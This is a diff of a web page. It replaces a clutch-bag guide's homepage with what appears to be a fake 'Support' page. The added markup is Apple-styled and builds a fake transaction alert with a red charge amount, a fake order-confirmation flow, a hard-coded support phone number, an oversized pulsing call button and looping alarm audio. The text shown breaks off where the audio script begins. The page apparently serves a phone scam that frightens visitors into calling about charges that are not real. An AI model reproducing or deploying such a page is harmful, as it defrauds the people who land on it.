@@ -1,58 +1,971 @@
-<!DOCTYPE html>
-<html lang="en">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Clutchy | Clutch Bag Styles, Occasion Matcher &amp; Evening Bag Guide</title>
-<meta name="description" content="Clutchy is an independent guide to clutches and evening bags, with six classic shapes, an occasion matcher, a what-fits packing tool and care tips.">
-<meta name="robots" content="index, follow, max-image-preview:large">
-<link rel="canonical" href="https://clutchy.com/">
-<meta property="og:type" content="website"><meta property="og:site_name" content="Clutchy">
-<meta property="og:title" content="Clutchy | Clutch Bag Styles, Occasion Matcher &amp; Evening Bag Guide"><meta property="og:description" content="Clutchy is an independent guide to clutches and evening bags, with six classic shapes, an occasion matcher, a what-fits packing tool and care tips.">
-<meta property="og:url" content="https://clutchy.com/"><meta property="og:image" content="https://images.unsplash.com/photo-1792219485600-d88e5f8bcf81?auto=format&fit=crop&w=1200&q=75">
-<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#111111">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Cpath d='M4 16h32l-3 18H7z' fill='%23D4AF37'/%3E%3Cpath d='M4 16l16 10 16-10' fill='none' stroke='%23111' stroke-width='2'/%3E%3C/svg%3E">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://images.unsplash.com">
-<link href="https://fonts.googleapis.com/css2?family=Limelight&family=Philosopher:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="assets/css/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "Organization", "name": "Clutchy", "url": "https://clutchy.com", "email": "hello@clutchy.com", "telephone": "+1-888-777-5845", "address": {"@type": "PostalAddress", "streetAddress": "181 Mercer Street", "addressLocality": "New York", "addressRegion": "NY", "postalCode": "10012", "addressCountry": "US"}}, {"@type": "WebSite", "name": "Clutchy", "url": "https://clutchy.com"}]}</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+
+    <title>Contact - Support</title>
+
+    <link rel="stylesheet" href="css/kTa00i9n5NV8.html" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253Dsf%20pro%252Cv1_7csf%20pro%20icons%252Cv1html.html">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2DMKRPGVF0');
+</script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 </head>
-<body class="">
-<a class="skip" href="#main">Skip to content</a>
-<header class="cl-hd"><div class="cl-w cl-hd-in"><a class="logo" href="./" aria-label="Clutchy home"><svg viewBox="0 0 40 40" aria-hidden="true"><path d="M4 16h32l-3 18H7z" fill="#D4AF37"/><path d="M4 16l16 10 16-10" fill="none" stroke="#111" stroke-width="2"/><path d="M14 16a6 6 0 0 1 12 0" fill="none" stroke="#D4AF37" stroke-width="2.5"/><circle cx="20" cy="26" r="2.2" fill="#111"/></svg><span>CLUTCHY</span></a><nav id="nav" aria-label="Main navigation"><ul><li><a href="./" aria-current="page">Home</a></li><li><a href="clutch-styles-guide.html">Clutch Styles</a></li><li><a href="evening-bag-packing-guide.html">Packing</a></li><li><a href="about.html">About</a></li><li><a href="contact.html">Contact</a></li></ul></nav><button class="burger" aria-label="Open menu" aria-expanded="false" aria-controls="nav"><i></i><i></i><i></i></button></div></header>
-<main id="main">
 
-<section class="cl-hero"><div class="cl-w cl-hero-g"><div class="cl-hero-t"><p class="cl-k">&#10022; The evening edit &#10022;</p><h1>Small bag. Big entrance.</h1><p class="cl-lead">Clutchy is an independent guide to clutches and evening bags: the classic shapes, which one suits the occasion, what really fits inside and how to look after it.</p><a class="cl-btn" href="#match">Match a clutch to your evening</a></div><figure class="cl-deco"><img src="https://images.unsplash.com/photo-1792219485600-d88e5f8bcf81?auto=format&fit=crop&w=520&h=640&q=75" alt="a woman in a red sequined gown and gloves sitting on a white sofa" width="520" height="640" fetchpriority="high"><svg class="cl-sun" viewBox="0 0 400 200" aria-hidden="true"><line x1="200" y1="200" x2="0.0" y2="200.0" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="4.4" y2="158.4" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="17.3" y2="118.7" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="38.2" y2="82.4" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="66.2" y2="51.4" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="100.0" y2="26.8" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="138.2" y2="9.8" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="179.1" y2="1.1" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="220.9" y2="1.1" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="261.8" y2="9.8" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="300.0" y2="26.8" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="333.8" y2="51.4" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="361.8" y2="82.4" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="382.7" y2="118.7" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="395.6" y2="158.4" stroke="#D4AF37" stroke-width="2"/><line x1="200" y1="200" x2="400.0" y2="200.0" stroke="#D4AF37" stroke-width="2"/></svg></figure></div></section>
+<script>
+ 
+  window.SUPPORT_PHONE = {
+    display: "+1(888) 905-2046",   
+    tel:     "+18889052046"        
+  };
+</script>
 
-<section class="cl-s"><div class="cl-w"><div class="cl-sh-h"><p class="cl-k">&#10022; The shapes &#10022;</p><h2>Six clutches to know</h2></div><div class="cl-shs"><div class="cl-sh"><div class="cl-sh-i"><svg viewBox="0 0 120 100" aria-hidden="true"><rect x="10" y="30" width="100" height="56" rx="3" fill="#D4AF37"/><path d="M10 30l50 32 50-32" fill="#B8962E" stroke="#111" stroke-width="1.5"/></svg></div><h3>Envelope</h3><p>A flat rectangle with a fold-over flap, like a letter.</p><em>Best for: Weddings, dinners, work events</em></div><div class="cl-sh"><div class="cl-sh-i"><svg viewBox="0 0 120 100" aria-hidden="true"><path d="M18 44h84l-6 42H24z" fill="#D4AF37"/><path d="M18 44q42-26 84 0" fill="none" stroke="#111" stroke-width="3"/><circle cx="54" cy="34" r="4" fill="#111"/><circle cx="66" cy="34" r="4" fill="#111"/></svg></div><h3>Frame (kiss-lock)</h3><p>A hinged metal frame that snaps shut with two small balls.</p><em>Best for: Vintage looks, evening dresses</em></div><div class="cl-sh"><div class="cl-sh-i"><svg viewBox="0 0 120 100" aria-hidden="true"><rect x="20" y="30" width="80" height="56" rx="6" fill="#D4AF37"/><rect x="20" y="30" width="80" height="16" fill="#B8962E"/><rect x="54" y="42" width="12" height="8" fill="#111"/></svg></div><h3>Box</h3><p>A rigid box shape with a clasp. Holds its form and protects contents.</p><em>Best for: Black tie, formal dinners</em></div><div class="cl-sh"><div class="cl-sh-i"><svg viewBox="0 0 120 100" aria-hidden="true"><path d="M30 40h60l10 22-10 22H30l-10-22z" fill="#D4AF37"/><path d="M30 40l30 44 30-44M20 62h80" stroke="#111" stroke-width="1.2" fill="none"/></svg></div><h3>Minaudi&egrave;re</h3><p>A tiny, jewel-like hard case, often beaded or metallic.</p><em>Best for: Galas, red carpets</em></div><div class="cl-sh"><div class="cl-sh-i"><svg viewBox="0 0 120 100" aria-hidden="true"><path d="M26 40q34-14 68 0l8 40q-42 14-84 0z" fill="#D4AF37"/><path d="M36 42l6 38M52 38l2 44M68 38l-2 44M84 42l-6 38" stroke="#B8962E" stroke-width="3"/></svg></div><h3>Pouch</h3><p>Soft, gathered or pleated, sometimes with a drawstring or knot.</p><em>Best for: Parties, summer evenings</em></div><div class="cl-sh"><div class="cl-sh-i"><svg viewBox="0 0 120 100" aria-hidden="true"><rect x="24" y="44" width="72" height="42" rx="6" fill="#D4AF37"/><path d="M24 50h72" stroke="#111" stroke-width="2"/><path d="M90 46q24-28 0-40" fill="none" stroke="#B8962E" stroke-width="5"/></svg></div><h3>Wristlet</h3><p>A small zip clutch with a loop to wear on the wrist.</p><em>Best for: Dancing, busy events, hands free</em></div></div></div></section>
 
-<section class="cl-s cl-cham" id="match"><div class="cl-w cl-mt"><div><p class="cl-k">&#10022; Occasion matcher &#10022;</p><h2>Which clutch for tonight?</h2><label for="mt-e">The occasion<select id="mt-e"><option value="0">Black-tie gala</option><option value="1">Wedding guest</option><option value="2">Dinner out</option><option value="3">Party or dancing</option><option value="4">Work event</option><option value="5">Summer garden party</option></select></label><label for="mt-c">Your outfit colour<select id="mt-c"><option value="0">Black</option><option value="1">White or cream</option><option value="2">Red or pink</option><option value="3">Blue or green</option><option value="4">Patterned or print</option><option value="5">Metallic or sequins</option></select></label><label for="mt-m">Your jewellery<select id="mt-m"><option value="0">Gold</option><option value="1">Silver</option><option value="2">Mixed or none</option></select></label></div><div class="cl-card" id="mt-o" aria-live="polite"></div></div></section>
+<style>
 
-<section class="cl-trip"><div class="cl-w"><figure><img src="https://images.unsplash.com/photo-1793637640234-d6ca0d4a714b?auto=format&fit=crop&w=380&h=520&q=75" alt="a woman in a sequined green gown and tiara in a candlelit room" width="380" height="520" loading="lazy"><figcaption>The gala</figcaption></figure><figure class="cl-mid"><img src="https://images.unsplash.com/photo-1794262791868-f06e48bb5952?auto=format&fit=crop&w=380&h=520&q=75" alt="a man in a tuxedo and a woman in a red dress on outdoor stairs at night" width="380" height="520" loading="lazy"><figcaption>The night out</figcaption></figure><figure><img src="https://images.unsplash.com/photo-1790669672687-36c1f807eb61?auto=format&fit=crop&w=380&h=520&q=75" alt="a woman in a black velvet top with a sequined flower" width="380" height="520" loading="lazy"><figcaption>The candlelit dinner</figcaption></figure></div></section>
 
-<section class="cl-s" id="fits"><div class="cl-w cl-ft2"><div><p class="cl-k">&#10022; What fits? &#10022;</p><h2>Pack it before you buy it</h2><p>Tick what you want to carry and choose your phone size. We will tell you the smallest style that will close comfortably.</p><fieldset class="cl-fs"><legend>My essentials</legend><div class="cl-items"><label><input type="checkbox" value="3" checked> Phone</label><label><input type="checkbox" value="1" checked> Keys</label><label><input type="checkbox" value="1" checked> Cardholder</label><label><input type="checkbox" value="1" checked> Lipstick</label><label><input type="checkbox" value="1"> Compact or powder</label><label><input type="checkbox" value="1"> Tissues</label><label><input type="checkbox" value="3"> Sunglasses</label><label><input type="checkbox" value="2"> Mini phone charger</label><label><input type="checkbox" value="1"> Hand cream</label><label><input type="checkbox" value="1"> Mints</label></div></fieldset><label for="ft-p">Phone<select id="ft-p"><option value="0">Compact (under 6 in)</option><option value="1" selected>Standard (6&ndash;6.5 in)</option><option value="2">Large (6.7 in and up)</option></select></label></div>
-<div class="cl-bag"><svg viewBox="0 0 300 220" aria-hidden="true"><defs><clipPath id="bagc"><rect x="20" y="60" width="260" height="140" rx="10"/></clipPath></defs><rect x="20" y="60" width="260" height="140" rx="10" fill="#1B1B1B" stroke="#D4AF37" stroke-width="3"/><rect id="fill" x="20" y="200" width="260" height="0" fill="#D4AF37" opacity=".85" clip-path="url(#bagc)"/><path d="M20 70l130 70 130-70" fill="none" stroke="#D4AF37" stroke-width="2" opacity=".6"/><line id="cap" x1="20" y1="80" x2="280" y2="80" stroke="#F4E9D2" stroke-dasharray="6 4"/></svg><div class="cl-bag-o" id="ft-o" aria-live="polite"></div></div></div></section>
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.55);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  z-index: 99999;
+}
 
-<section class="cl-s cl-cham"><div class="cl-w cl-care"><div class="cl-frame"><p class="cl-k">&#10022; Care &#10022;</p><h2>Keep it gala-ready</h2><ul><li><b>Store it stuffed</b> with tissue paper so it keeps its shape.</li><li><b>Use the dust bag</b> and keep it out of direct sunlight.</li><li><b>Hang chains inside</b> the bag, not over the edge, to avoid marks.</li><li><b>Satin and velvet</b> brush gently; spot-clean only.</li><li><b>Metal frames</b> wipe with a soft dry cloth after each use.</li><li><b>Beading</b> check threads before an event; re-stitch loose beads early.</li></ul></div><figure class="cl-arch"><img src="https://images.unsplash.com/photo-1761646238225-6aa73c578344?auto=format&fit=crop&w=420&h=520&q=75" alt="a pleated purple handbag with a single handle" width="420" height="520" loading="lazy"></figure></div></section>
+.ps-popup {
+  width: 100%;
+  max-width: 430px;
+  background: #ffffff;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+  animation: popupIn 0.25s ease-out;
+  position: relative;
+}
 
-<section class="cl-s"><div class="cl-w cl-doors"><a href="clutch-styles-guide.html"><span>&#10022; Chapter I &#10022;</span><b>The Clutch Styles Guide</b><em>Shapes, materials, closures and straps, and how to choose.</em></a><a href="evening-bag-packing-guide.html"><span>&#10022; Chapter II &#10022;</span><b>The Evening Bag Packing Guide</b><em>The essentials list, small-bag tricks and staying hands-free.</em></a></div></section>
+@keyframes popupIn {
+  from { opacity: 0; transform: translateY(15px) scale(0.97); }
+  to   { opacity: 1; transform: translateY(0)   scale(1);    }
+}
 
-</main>
-<footer class="cl-ft"><div class="cl-fan" aria-hidden="true"></div><div class="cl-w"><div class="cl-ft-top"><a class="logo" href="./"><svg viewBox="0 0 40 40" aria-hidden="true"><path d="M4 16h32l-3 18H7z" fill="#D4AF37"/><path d="M4 16l16 10 16-10" fill="none" stroke="#111" stroke-width="2"/><path d="M14 16a6 6 0 0 1 12 0" fill="none" stroke="#D4AF37" stroke-width="2.5"/><circle cx="20" cy="26" r="2.2" fill="#111"/></svg><span>CLUTCHY</span></a><p>An independent guide to clutches and evening bags: styles, occasions, packing and care.</p></div><div class="cl-ft-g"><div><h4>The guides</h4><a href="clutch-styles-guide.html">Clutch Styles Guide</a><a href="evening-bag-packing-guide.html">Evening Bag Packing Guide</a><a href="./#match">Occasion matcher</a><a href="./#fits">What fits?</a></div><div><h4>The house</h4><a href="about.html">About</a><a href="contact.html">Contact</a><a href="editorial-policy.html">Editorial Policy</a></div><div><h4>The fine print</h4><a href="privacy-policy.html">Privacy Policy</a><a href="terms-and-conditions.html">Terms &amp; Conditions</a><a href="cookie-policy.html">Cookie Policy</a><a href="disclaimer.html">Disclaimer</a></div><div><h4>RSVP</h4><p>181 Mercer Street, New York, NY 10012, United States</p><a href="tel:+18887775845">+1-888-777-5845</a><a href="mailto:hello@clutchy.com">hello@clutchy.com</a></div></div><p class="cl-ft-c">&copy; <span id="year">2026</span> Clutchy &middot; All rights reserved</p></div></footer>
-<div class="cookie" id="cookie" role="dialog" aria-label="Cookie notice"><p>We use essential storage and, with your consent, cookies for our live chat and any ads shown on the site. <a href="cookie-policy.html">Cookie Policy</a></p><button class="y" data-cookie="accepted">Accept</button><button data-cookie="declined">Essential only</button></div>
-<script src="assets/js/main.js" defer></script>
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/626be649b0d10b6f3e6ff291/1g1qnn49c';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
+.ps-popup .popup-header {
+  background: #ffffff;
+  padding: 24px 24px 18px;
+  border-bottom: 0.5px solid #e5e5ea;
+  text-align: center;
+}
+
+.ps-popup .brand-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 14px;
+}
+
+.ps-popup .brand-icon img {
+  width: 140px;
+  height: auto;
+  display: block;
+  margin-top: -10px;
+  margin-bottom: -15px;
+}
+
+.ps-popup .popup-header h2 {
+  color: #222;
+  font-size: 21px;
+  margin-bottom: 5px;
+  text-align: center;
+}
+
+.ps-popup .popup-header p {
+  color: #666;
+  font-size: 15px;
+  text-align: center;
+}
+
+.ps-popup .popup-body {
+  padding: 22px 24px;
+}
+
+.ps-popup .popup-body > p {
+  font-size: 14px;
+  color: #333;
+  line-height: 1.5;
+  margin: 0 0 8px;
+}
+
+.ps-popup .transaction-box {
+  background: #f7f7f9;
+  border-radius: 13px;
+  padding: 16px;
+  margin: 16px 0;
+}
+
+.ps-popup .transaction-row {
+  display: flex;
+  justify-content: space-between;
+  gap: 15px;
+  padding: 8px 0;
+  font-size: 14px;
+}
+
+.ps-popup .transaction-row span:first-child {
+  color: #777;
+}
+
+.ps-popup .transaction-row span:last-child {
+  color: #222;
+  font-weight: 600;
+  text-align: right;
+}
+
+.ps-popup .amount {
+  color: #d92d20 !important;
+  font-size: 16px;
+}
+
+.ps-popup .status {
+  color: #16803c !important;
+}
+
+.ps-popup .notice {
+  background: #fff4f2;
+  border-left: 4px solid #e5484d;
+  padding: 12px;
+  border-radius: 7px;
+  color: #6b2525;
+  font-size: 15px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.ps-popup .buttons {
+  display: flex;
+  gap: 10px;
+}
+
+.ps-popup button {
+  flex: 1;
+  border-radius: 11px;
+  padding: 13px 10px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+.ps-popup .primary-btn {
+  background: #000;
+  color: #fff;
+  border: none;
+}
+
+.ps-popup .primary-btn:hover {
+  background: #222;
+}
+
+.ps-popup .secondary-btn {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+}
+
+.ps-popup .secondary-btn:hover {
+  background: #f5f5f5;
+}
+
+.ps-popup .popup-footer {
+  padding: 0 24px 22px;
+  color: #888;
+  font-size: 11px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .ps-popup { border-radius: 16px; }
+  .ps-popup .popup-body,
+  .ps-popup .popup-header { padding-left: 20px; padding-right: 20px; }
+}
+
+/* ===== EXISTING STYLES ===== */
+@media (min-width: 768px) {
+    .popup-content .btn-row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .popup-content .btn-row button {
+    flex: 1;
+    margin: 0;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 8px;
+}
+}
+
+    .popup {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 140%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+.popup-content button {
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+.popup-content .btn-row button:first-child {
+    background: #000;
+    color: #fff;
+    border: none;
+}
+
+.popup-content .btn-row button:last-child {
+    background: #fff;
+    color: #000;
+    border: 2px solid #000;
+}
+
+.popup-content > button {
+    width: 100%;
+    margin-top: 12px;
+    background: #f5f5f5;
+    border: 2px solid #000;
+}
+
+.popup-content {
+    background: linear-gradient(135deg, #ffffff, #f2f2f2);
+    color: #000;
+    width: 420px;
+    max-width: 90%;
+    text-align: center;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    transform: translateY(-40%);
+}
+.popup-content p {
+    width: 100%;
+    text-align: left;
+    margin-bottom: 20px;
+}
+.popup-title {
+    width: 100%;
+    text-align: center;
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 20px;
+    color: #fff;
+    line-height: 1.4;
+}
+.popup-text {
+    width: 100%;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 1.5;
+    color: #000;
+    margin-bottom: 20px;
+}
+@import url('https://fonts.googleapis.com/css2?family=Manrope:wght@500;700&amp;display=swap');
+
+  .call-popup-wrapper {
+    position: fixed;
+    bottom: 50px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    opacity: 0;
+    animation: none;
+  }
+
+  .call-popup-btn {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #111111;
+    color: #ffffff;
+    text-decoration: none;
+    padding: 32px 72px;
+    border-radius: 50px;
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.35), 0 2px 8px rgba(0,0,0,0.18);
+    transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+    white-space: nowrap;
+    border: none;
+    cursor: pointer;
+  }
+
+  .call-popup-btn:hover {
+    background: #222222;
+    transform: translateX(-0%) translateY(-3px);
+    box-shadow: 0 16px 40px rgba(0, 0, 0, 0.4), 0 4px 12px rgba(0,0,0,0.2);
+  }
+
+  .call-popup-btn:active {
+    transform: translateX(-0%) translateY(0px);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+  }
+
+  .call-icon-wrap {
+    position: relative;
+    width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .call-icon-wrap::before {
+    content: '';
+    position: absolute;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.12);
+    animation: pulse 1.8s ease-out infinite;
+  }
+
+  .call-icon {
+    width: 18px;
+    height: 18px;
+    fill: #ffffff;
+    position: relative;
+    z-index: 1;
+  }
+
+  .call-label {
+    text-decoration: underline;
+    text-underline-offset: 3px;
+    text-decoration-thickness: 1.5px;
+    text-decoration-color: rgba(255,255,255,0.5);
+  }
+
+  @keyframes pulse {
+    0%   { transform: scale(0.8); opacity: 0.8; }
+    70%  { transform: scale(1.6); opacity: 0;   }
+    100% { transform: scale(0.8); opacity: 0;   }
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateX(-50%) translateY(24px); }
+    to   { opacity: 1; transform: translateX(-50%) translateY(0);    }
+  }
+
+  @media (max-width: 480px) {
+    .call-popup-btn {
+      padding: 22px 44px;
+      font-size: 22px;
+    }
+  }
+  .popup-heading {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin-bottom: 8px;
+}
+
+.popup-subtext {
+    font-size: 18px;
+    font-weight: 700;
+    line-height: 1.6;
+    margin: 0;
+    text-align: right;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      width: 100%;
+      min-height: 100dvh;
+      overflow-x: hidden;
+      overflow-y: auto;
+      background: #f5f5f7;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+      touch-action: pan-x pan-y;
+    }
+
+    .apple-nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(245,245,247,0.92);
+      backdrop-filter: saturate(180%) blur(20px);
+      -webkit-backdrop-filter: saturate(180%) blur(20px);
+      border-bottom: 0.5px solid #d2d2d7;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 clamp(1rem, 5vw, 1.5rem);
+      z-index: 100;
+    }
+    .nav-left { display: flex; align-items: center; gap: 8px; }
+    .nav-title { font-size: 17px; font-weight: 600; color: #1d1d1f; letter-spacing: -0.3px; }
+
+    .nav-cart {
+      display: flex; align-items: center; justify-content: center;
+      width: 38px; height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      position: relative;
+      -webkit-tap-highlight-color: transparent;
+      transition: background 0.15s;
+    }
+    .nav-cart:active { background: #e5e5ea; }
+    .cart-badge {
+      position: absolute;
+      top: 1px; right: 1px;
+      width: 17px; height: 17px;
+      background: #0071e3;
+      border-radius: 50%;
+      font-size: 10px; font-weight: 700;
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #f5f5f7;
+    }
+
+    #processing {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100dvh;
+      padding-top: 52px;
+      background: #f5f5f7;
+      text-align: center;
+      padding-left: 1rem;
+      padding-right: 1rem;
+    }
+
+    #confirmed {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      width: 100%;
+      min-height: 100dvh;
+      padding-top: 68px;
+      padding-bottom: max(env(safe-area-inset-bottom, 16px), 20px);
+      padding-left: clamp(12px, 4vw, 20px);
+      padding-right: clamp(12px, 4vw, 20px);
+      gap: 0;
+      overflow: visible;
+    }
+
+    canvas#confetti {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none; z-index: 98;
+    }
+
+    .spinner {
+      width: 38px; height: 38px;
+      border: 2.5px solid #d2d2d7;
+      border-top: 2.5px solid #1d1d1f;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+      margin-top: 1.25rem;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .check-ring {
+      width: clamp(44px, 12vw, 60px);
+      height: clamp(44px, 12vw, 60px);
+      border-radius: 50%; background: #34c759;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto clamp(4px, 1.2vh, 8px);
+      animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      flex-shrink: 0;
+    }
+    @keyframes popIn { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      padding: clamp(10px, 2.2vh, 18px) clamp(14px, 4vw, 20px);
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+      flex-shrink: 0;
+    }
+
+    .divider {
+      height: 0.5px;
+      background: #e5e5ea;
+      margin: clamp(6px, 1.4vh, 10px) 0;
+      width: 100%;
+    }
+
+    .progress-wrap {
+      display: flex; align-items: flex-start;
+      justify-content: center; width: 100%;
+    }
+    .step { display: flex; flex-direction: column; align-items: center; gap: 4px; flex: 1; }
+    .dot {
+      width: clamp(22px, 6vw, 28px);
+      height: clamp(22px, 6vw, 28px);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: clamp(9px, 2.5vw, 11px); font-weight: 600;
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .dot.done  { background: #1d1d1f; color: #fff; }
+    .dot.active{ background: #0071e3; color: #fff; }
+    .dot.pending{ background: #e5e5ea; color: #aeaeb2; }
+    .step-line {
+      flex: 1; height: 2px;
+      margin-top: clamp(10px, 2.8vw, 13px);
+      z-index: 0;
+    }
+    .step-line.done   { background: #1d1d1f; }
+    .step-line.pending{ background: #e5e5ea; }
+    .step-lbl {
+      font-size: clamp(9px, 2.4vw, 11px);
+      text-align: center; letter-spacing: -0.1px;
+    }
+    .step-lbl.done   { color: #1d1d1f; font-weight: 500; }
+    .step-lbl.active { color: #0071e3; font-weight: 500; }
+    .step-lbl.pending{ color: #aeaeb2; }
+
+    .order-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: clamp(5px, 1.2vh, 8px) 0;
+    }
+    .order-row + .order-row { border-top: 0.5px solid #e5e5ea; }
+
+    .alert-card {
+      background: #fff9ec;
+      border-radius: 14px;
+      padding: clamp(8px, 1.8vh, 14px) clamp(12px, 4vw, 16px);
+      width: 100%; max-width: 420px;
+      flex-shrink: 0;
+    }
+
+    .btn-call {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #0071e3; color: #fff;
+      border: none; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 500;
+      cursor: pointer; text-decoration: none; text-align: center;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-call:active { background: #0062c3; }
+
+    .btn-ignore {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #fff; color: #1d1d1f;
+      border: 0.5px solid #d2d2d7; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 400;
+      cursor: pointer; text-align: center;
+      margin-top: 6px;
+      text-decoration: none;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-ignore:active { background: #f2f2f7; }
+
+    .sub-text {
+      width: 100%; max-width: 420px;
+      text-align: center;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #6e6e73;
+      line-height: 1.55;
+      margin-bottom: clamp(4px, 1vh, 8px);
+      flex-shrink: 0;
+    }
+
+    .card-header {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+    }
+    </style>
+
+<body>
+<audio id="audioDue">
+    <source src="due83.wav" type="audio/wav">
+</audio>
+
+<audio id="myAudio" loop>
+    <source src="auf7u4.wav" type="audio/wav">
+</audio>
+
+<script>
+const audio = document.getElementById("myAudio");
+const due   = document.getElementById("audioDue");
+
